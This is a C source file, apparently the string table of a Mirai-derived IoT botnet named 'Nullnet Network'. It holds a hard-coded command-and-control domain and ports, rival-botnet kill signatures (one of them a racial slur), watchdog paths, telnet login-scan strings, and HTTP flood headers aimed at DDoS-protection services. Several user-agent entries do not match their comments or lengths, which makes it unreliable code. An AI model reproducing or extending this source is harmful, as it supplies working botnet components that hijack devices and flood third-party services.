#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/util.h"

uint32_t table_key = 0x13370420;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
	//..:: Nullnet Network ::..
	add_entry(TABLE_EXEC_SUCCESS, "\x2E\x2E\x3A\x3A\x20\x4E\x75\x6C\x6C\x6E\x65\x74\x20\x4E\x65\x74\x77\x6F\x72\x6B\x20\x3A\x3A\x2E\x2E\x00", 26);
	//This device is already on Nullnet Network
	add_entry(TABLE_INSTANCE_EXISTS, "\x54\x68\x69\x73\x20\x64\x65\x76\x69\x63\x65\x20\x69\x73\x20\x61\x6C\x72\x65\x61\x64\x79\x20\x6F\x6E\x20\x4E\x75\x6C\x6C\x6E\x65\x74\x20\x4E\x65\x74\x77\x6F\x72\x6B\x00", 42);
	//net.booter.pro
	add_entry(TABLE_CNC_DOMAIN, "\x6E\x65\x74\x2E\x62\x6F\x6F\x74\x65\x72\x2E\x70\x72\x6F\x00", 15);
	add_entry(TABLE_SCAN_DOMAIN, "\x6E\x65\x74\x2E\x62\x6F\x6F\x74\x65\x72\x2E\x70\x72\x6F\x00", 15);
	//ports
	add_entry(TABLE_CNC_PORT, "\x05\x8C", 2); //1420
	add_entry(TABLE_SCAN_CB_PORT, "\xEF\xEC", 2); //61420
	// /proc/
	add_entry(TABLE_KILLER_PROC, "\x2F\x70\x72\x6F\x63\x2F\x00", 7);
	// /exe
	add_entry(TABLE_KILLER_EXE, "\x2F\x65\x78\x65\x00", 5);
	// /fd
	add_entry(TABLE_KILLER_FD, "\x2F\x66\x64\x00", 4);
	// /maps
	add_entry(TABLE_KILLER_MAPS, "\x2F\x6D\x61\x70\x73\x00", 6);
	// /proc/net/tcp
	add_entry(TABLE_KILLER_TCP, "\x2F\x70\x72\x6F\x63\x2F\x6E\x65\x74\x2F\x74\x63\x70\x00", 14);
	// UPX!
	add_entry(TABLE_MEM_1, "\x55\x50\x58\x21\x00", 5);
	// sysupdater
	add_entry(TABLE_MEM_2, "\x73\x79\x73\x75\x70\x64\x61\x74\x65\x72\x00", 11);
	// KILLATTK
	add_entry(TABLE_MEM_3, "\x4B\x49\x4C\x4C\x41\x54\x54\x4B\x00", 9);
	// BOGOMIPS
	add_entry(TABLE_MEM_4, "\x42\x4F\x47\x4F\x4D\x49\x50\x53\x00", 9);
	// pandora
	add_entry(TABLE_MEM_5, "\x70\x61\x6E\x64\x6F\x72\x61\x00", 8);
	// Mercury
	add_entry(TABLE_MEM_6, "\x4D\x65\x72\x63\x75\x72\x79\x00", 8);
	// crsfi
	add_entry(TABLE_MEM_7, "\x63\x72\x73\x66\x69\x00", 6);
	// ahsok
	add_entry(TABLE_MEM_8, "\x61\x68\x73\x6F\x6B\x00", 6);
	// Rooted
	add_entry(TABLE_MEM_9, "\x52\x6F\x6F\x74\x65\x64\x00", 7);
	// REKAI
	add_entry(TABLE_MEM_10, "\x52\x45\x4B\x41\x49\x00", 6);
	// miori
	add_entry(TABLE_MEM_11, "\x6D\x69\x6F\x72\x69\x00", 6);
	// MASUTA
	add_entry(TABLE_MEM_12, "\x4D\x41\x53\x55\x54\x41\x00", 7);
	// GhostWuzHere666
	add_entry(TABLE_MEM_13, "\x47\x68\x6F\x73\x74\x57\x75\x7A\x48\x65\x72\x65\x36\x36\x36\x00", 16);
	// Corona
	add_entry(TABLE_MEM_14, "\x43\x6F\x72\x6F\x6E\x61\x00", 7);
	// loligang
	add_entry(TABLE_MEM_15, "\x6C\x6F\x6C\x69\x67\x61\x6E\x67\x00", 9);
	// lolxd
	add_entry(TABLE_MEM_16, "\x6C\x6F\x6C\x78\x64\x00", 6);
	// NiGGeR69xd
	add_entry(TABLE_MEM_17, "\x4E\x69\x47\x47\x65\x52\x36\x39\x78\x64\x00", 11);
	// nuclear
	add_entry(TABLE_MEM_18, "\x6E\x75\x63\x6C\x65\x61\x72\x00", 8);
	// dvrHelper
	add_entry(TABLE_MEM_19, "\x64\x76\x72\x48\x65\x6C\x70\x65\x72\x00", 10);
	// yakuza
	add_entry(TABLE_MEM_20, "\x79\x61\x6B\x75\x7A\x61\x00", 7);
	// UnHAnaAW
	add_entry(TABLE_MEM_21, "\x55\x6E\x48\x41\x6E\x61\x41\x57\x00", 9);
	// Ares
	add_entry(TABLE_MEM_22, "\x41\x72\x65\x73\x00", 5);
	// lessie.
	add_entry(TABLE_MEM_23, "\x6C\x65\x73\x73\x69\x65\x2E\x00", 8);
	// Hilix
	add_entry(TABLE_MEM_24, "\x48\x69\x6C\x69\x78\x00", 6);
	// Reaper.
	add_entry(TABLE_MEM_25, "\x52\x65\x61\x70\x65\x72\x2E\x00", 8);
	// Alex
	add_entry(TABLE_MEM_26, "\x41\x6C\x65\x78\x00", 5);
	// sora
	add_entry(TABLE_MEM_27, "\x73\x6F\x72\x61\x00", 5);
	// Amakano
	add_entry(TABLE_MEM_28, "\x41\x6D\x61\x6B\x61\x6E\x6F\x00", 8);
	// rzr
	add_entry(TABLE_MEM_29, "\x72\x7A\x72\x00", 4);
	// nya
	add_entry(TABLE_MEM_30, "\x6E\x79\x61\x00", 4);
	// mezy
	add_entry(TABLE_MEM_31, "\x6D\x65\x7A\x79\x00", 5);
	// zhr
	add_entry(TABLE_MEM_32, "\x7A\x68\x72\x00", 4);
	// lzrd
	add_entry(TABLE_MEM_33, "\x6C\x7A\x72\x64\x00", 5);
	// Gummy
	add_entry(TABLE_MEM_34, "\x47\x75\x6D\x6D\x79\x00", 6);
	// Mozi
	add_entry(TABLE_MEM_35, "\x4D\x6F\x7A\x69\x00", 5);
	// Yakuza
	add_entry(TABLE_MEM_36, "\x59\x61\x6B\x75\x7A\x61\x00", 7);
	// daddyl33t
	add_entry(TABLE_MEM_37, "\x64\x61\x64\x64\x79\x6C\x33\x33\x74\x00", 10);
	// .un5
	add_entry(TABLE_MEM_38, "\x2E\x75\x6E\x35\x00", 5);
	// Demon.
	add_entry(TABLE_MEM_39, "\x44\x65\x6D\x6F\x6E\x2E\x00", 7);
	// Okami
	add_entry(TABLE_MEM_40, "\x4F\x6B\x61\x6D\x69\x00", 6);
	// /dev/watchdog
	add_entry(TABLE_MISC_WATCHDOG_1, "\x2F\x64\x65\x76\x2F\x77\x61\x74\x63\x68\x64\x6F\x67\x00", 14);
	// /dev/misc/watchdog
	add_entry(TABLE_MISC_WATCHDOG_2, "\x2F\x64\x65\x76\x2F\x6D\x69\x73\x63\x2F\x77\x61\x74\x63\x68\x64\x6F\x67\x00", 19);
	// /dev/FTWDT101_watchdog
	add_entry(TABLE_MISC_WATCHDOG_3, "\x2F\x64\x65\x76\x2F\x46\x54\x57\x44\x54\x31\x30\x31\x5F\x77\x61\x74\x63\x68\x64\x6F\x67\x00", 23);
	// /dev/FTWDT101\ watchdog
	add_entry(TABLE_MISC_WATCHDOG_4, "\x2F\x64\x65\x76\x2F\x46\x54\x57\x44\x54\x31\x30\x31\x5C\x20\x77\x61\x74\x63\x68\x64\x6F\x67\x00", 24);
	// shell
	add_entry(TABLE_SCAN_SHELL, "\x73\x68\x65\x6C\x6C\x00", 6);
	// enable
	add_entry(TABLE_SCAN_ENABLE, "\x65\x6E\x61\x62\x6C\x65\x00", 7);
	// system
	add_entry(TABLE_SCAN_SYSTEM, "\x73\x79\x73\x74\x65\x6D\x00", 7);
	// sh
	add_entry(TABLE_SCAN_SH, "\x73\x68\x00", 3);
	// /bin/busybox ECCHI
	add_entry(TABLE_SCAN_QUERY, "\x2F\x62\x69\x6E\x2F\x62\x75\x73\x79\x62\x6F\x78\x20\x45\x43\x43\x48\x49\x00", 19);
	// ECCHI: applet not found
	add_entry(TABLE_SCAN_RESP, "\x45\x43\x43\x48\x49\x3A\x20\x61\x70\x70\x6C\x65\x74\x20\x6E\x6F\x74\x20\x66\x6F\x75\x6E\x64\x00", 24);
	// ncorrect
	add_entry(TABLE_SCAN_NCORRECT, "\x6E\x63\x6F\x72\x72\x65\x63\x74\x00", 9);
	// assword
	add_entry(TABLE_SCAN_OGIN, "\x61\x73\x73\x77\x6F\x72\x64\x00", 8);
	// ogin
	add_entry(TABLE_SCAN_ASSWORD, "\x6F\x67\x69\x6E\x00", 5);
	// enter
	add_entry(TABLE_SCAN_ENTER, "\x65\x6E\x74\x65\x72\x00", 6);
	// /etc/resolv.conf
	add_entry(TABLE_ATK_RESOLVER, "\x2F\x65\x74\x63\x2F\x72\x65\x73\x6F\x6C\x76\x2E\x63\x6F\x6E\x66\x00", 17); 
	// nameserver
	add_entry(TABLE_ATK_NSERV, "\x6E\x61\x6D\x65\x73\x65\x72\x76\x65\x72\x00", 11);
	// Connection: keep-alive 
	add_entry(TABLE_ATK_KEEP_ALIVE, "\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x3A\x20\x6B\x65\x65\x70\x2D\x61\x6C\x69\x76\x65\x00", 23);
	// Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	add_entry(TABLE_ATK_ACCEPT, "\x41\x63\x63\x65\x70\x74\x3A\x20\x74\x65\x78\x74\x2F\x68\x74\x6D\x6C\x2C\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x68\x74\x6D\x6C\x2B\x78\x6D\x6C\x2C\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x6D\x6C\x3B\x71\x3D\x30\x2E\x39\x2C\x69\x6D\x61\x67\x65\x2F\x77\x65\x62\x70\x2C\x2A\x2F\x2A\x3B\x71\x3D\x30\x2E\x38\x00", 83);
	// Accept-Language: en-US,en;q=0.8
	add_entry(TABLE_ATK_ACCEPT_LNG, "\x41\x63\x63\x65\x70\x74\x2D\x4C\x61\x6E\x67\x75\x61\x67\x65\x3A\x20\x65\x6E\x2D\x55\x53\x2C\x65\x6E\x3B\x71\x3D\x30\x2E\x38\x00", 32);
	// Content-Type: application/x-www-form-urlencoded
	add_entry(TABLE_ATK_CONTENT_TYPE, "\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65\x3A\x20\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64\x00", 48);
	// setCookie('
	add_entry(TABLE_ATK_SET_COOKIE, "\x73\x65\x74\x43\x6F\x6F\x6B\x69\x65\x28\x27\x00", 12);
	// refresh:
	add_entry(TABLE_ATK_REFRESH_HDR, "\x72\x65\x66\x72\x65\x73\x68\x3A\x00", 9);
	// location:
	add_entry(TABLE_ATK_LOCATION_HDR, "\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3A\x00", 10);
	// set-cookie:
	add_entry(TABLE_ATK_SET_COOKIE_HDR, "\x73\x65\x74\x2D\x63\x6F\x6F\x6B\x69\x65\x3A\x00", 12);
	// content-length:
	add_entry(TABLE_ATK_CONTENT_LENGTH_HDR, "\x63\x6F\x6E\x74\x65\x6E\x74\x2D\x6C\x65\x6E\x67\x74\x68\x3A\x00", 16);
	// transfer-encoding:
	add_entry(TABLE_ATK_TRANSFER_ENCODING_HDR, "\x74\x72\x61\x6E\x73\x66\x65\x72\x2D\x65\x6E\x63\x6F\x64\x69\x6E\x67\x3A\x00", 19);
	// chunked
	add_entry(TABLE_ATK_CHUNKED, "\x63\x68\x75\x6E\x6B\x65\x64\x00", 8);
	// keep-alive
	add_entry(TABLE_ATK_KEEP_ALIVE_HDR, "\x6B\x65\x65\x70\x2D\x61\x6C\x69\x76\x65\x00", 11);
	// connection:
	add_entry(TABLE_ATK_CONNECTION_HDR, "\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x3A\x00", 12);
	// server: dosarrest
	add_entry(TABLE_ATK_DOSARREST, "\x73\x65\x72\x76\x65\x72\x3A\x20\x64\x6F\x73\x61\x72\x72\x65\x73\x74\x00", 18);
	// server: cloudflare-nginx
	add_entry(TABLE_ATK_CLOUDFLARE_NGINX, "\x73\x65\x72\x76\x65\x72\x3A\x20\x63\x6C\x6F\x75\x64\x66\x6C\x61\x72\x65\x2D\x6E\x67\x69\x6E\x78\x00", 25);
	// HTTP/1.1
	add_entry(TABLE_ATK_HTTP, "\x48\x54\x54\x50\x2F\x31\x2E\x31\x00", 9);
	// User-Agent:
	add_entry(TABLE_ATK_USERAGENT, "\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74\x3A\x00", 12);
	// Host:
	add_entry(TABLE_ATK_HOST, "\x48\x6F\x73\x74\x3A\x00", 6);
	// Cookie:
	add_entry(TABLE_ATK_COOKIE, "\x43\x6F\x6F\x6B\x69\x65\x3A\x00", 8);
	// http
	add_entry(TABLE_ATK_SEARCHHTTP, "\x68\x74\x74\x70\x00", 5);
	// url=
	add_entry(TABLE_ATK_URL, "\x75\x72\x6C\x3D\x00", 5);
	// POST
	add_entry(TABLE_ATK_POST, "\x50\x4F\x53\x54\x00", 5);
	// Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7
	add_entry(TABLE_HTTP_1, "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x4D\x61\x63\x69\x6E\x74\x6F\x73\x68\x3B\x20\x49\x6E\x74\x65\x6C\x20\x4D\x61\x63\x20\x4F\x53\x20\x58\x20\x31\x30\x5F\x31\x31\x5F\x36\x29\x20\x41\x70\x70\x6C\x65\x57\x65\x62\x4B\x69\x74\x2F\x36\x30\x31\x2E\x37\x2E\x37\x20\x28\x4B\x48\x54\x4D\x4C\x2C\x20\x6C\x69\x6B\x65\x20\x47\x65\x63\x6B\x6F\x29\x20\x56\x65\x72\x73\x69\x6F\x6E\x2F\x39\x2E\x31\x2E\x32\x20\x53\x61\x66\x61\x72\x69\x2F\x36\x30\x31\x2E\x37\x2E\x37\x00", 117);
	// Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36
	add_entry(TABLE_HTTP_2, "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x57\x69\x6E\x64\x6F\x77\x73\x20\x4E\x54\x20\x31\x30\x2E\x30\x3B\x20\x57\x69\x6E\x36\x34\x3B\x20\x78\x36\x34\x29\x20\x41\x70\x70\x6C\x65\x57\x65\x62\x4B\x69\x74\x2F\x35\x33\x37\x2E\x33\x36\x20\x28\x4B\x48\x54\x4D\x4C\x2C\x20\x6C\x69\x6B\x65\x20\x47\x65\x63\x6B\x6F\x29\x20\x43\x68\x72\x6F\x6D\x65\x2F\x36\x32\x2E\x30\x2E\x33\x32\x30\x32\x2E\x38\x39\x20\x53\x61\x66\x61\x72\x69\x2F\x35\x33\x37\x2E\x33\x36\x00", 115);
	// Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36
	add_entry(TABLE_HTTP_3, "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x57\x69\x6E\x64\x6F\x77\x73\x20\x4E\x54\x20\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x57\x69\x6E\x64\x6F\x77\x73\x20\x4E\x54\x20\x36\x2E\x31\x3B\x20\x57\x4F\x57\x36\x34\x29\x20\x41\x70\x70\x6C\x65\x57\x65\x62\x4B\x69\x74\x2F\x35\x33\x37\x2E\x33\x36\x20\x28\x4B\x48\x54\x4D\x4C\x2C\x20\x6C\x69\x6B\x65\x20\x47\x65\x63\x6B\x6F\x29\x20\x43\x68\x72\x6F\x6D\x65\x2F\x34\x38\x2E\x30\x2E\x32\x35\x36\x34\x2E\x31\x30\x39\x20\x53\x61\x66\x61\x72\x69\x2F\x35\x33\x37\x2E\x33\x36\x00", 134);
	// Mozilla/5.0 (Windows NT 6.3; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
	add_entry(TABLE_HTTP_4, "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x57\x69\x6E\x64\x6F\x77\x73\x20\x4E\x54\x20\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x57\x69\x6E\x64\x6F\x77\x73\x20\x4E\x54\x20\x36\x2E\x33\x3B\x20\x57\x4F\x57\x36\x34\x3B\x20\x72\x76\x3A\x35\x30\x2E\x30\x29\x20\x47\x65\x63\x6B\x6F\x2F\x32\x30\x31\x30\x30\x31\x30\x31\x20\x46\x69\x72\x65\x66\x6F\x78\x2F\x35\x30\x2E\x30\x00", 97);
	// Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36
	add_entry(TABLE_HTTP_5, "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x57\x69\x6E\x64\x6F\x77\x73\x20\x4E\x54\x22\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x57\x69\x6E\x64\x6F\x77\x73\x20\x4E\x54\x20\x36\x2E\x33\x3B\x20\x57\x4F\x57\x36\x34\x29\x20\x41\x70\x70\x6C\x65\x57\x65\x62\x4B\x69\x74\x2F\x35\x33\x37\x2E\x33\x36\x20\x28\x4B\x48\x54\x4D\x4C\x2C\x20\x6C\x69\x6B\x65\x20\x47\x65\x63\x6B\x6F\x29\x20\x43\x68\x72\x6F\x6D\x65\x2F\x35\x31\x2E\x30\x2E\x32\x37\x30\x34\x2E\x31\x30\x36\x20\x53\x61\x66\x61\x72\x69\x2F\x35\x33\x37\x2E\x33\x36\x00", 134);
	// abcdefghijklmnopqrstuvwxyz1234567890
	add_entry(TABLE_RANDOM, "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30\x00", 37);
}

void table_unlock_val(uint8_t id)
{
	struct table_value *val = &table[id];
#ifdef DEBUG
	if (!val->locked)
	{
		printf("[nullnet/table] tried to double-unlock value %d\n", id);
		return;
	}
#endif
	toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
	struct table_value *val = &table[id];
#ifdef DEBUG
	if (val->locked)
	{
		printf("[nullnet/table] tried to double-lock value\n");
		return;
	}
#endif
	toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
	struct table_value *val = &table[id];
#ifdef DEBUG
	if (val->locked)
	{
		printf("[nullnet/table] tried to access table.%d but it is locked\n", id);
		return NULL;
	}
#endif
	if (len != NULL)
		*len = (int)val->val_len;
	return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
	char *cpy = malloc(buf_len);
	util_memcpy(cpy, buf, buf_len);
	table[id].val = cpy;
	table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
	table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
	int i;
	struct table_value *val = &table[id];
	uint8_t k1 = table_key & 0xff,
			k2 = (table_key >> 8) & 0xff,
			k3 = (table_key >> 16) & 0xff,
			k4 = (table_key >> 24) & 0xff;

	for (i = 0; i < val->val_len; i++)
	{
		val->val[i] ^= k1;
		val->val[i] ^= k2;
		val->val[i] ^= k3;
		val->val[i] ^= k4;
	}

#ifdef DEBUG
	val->locked = !val->locked;
#endif
}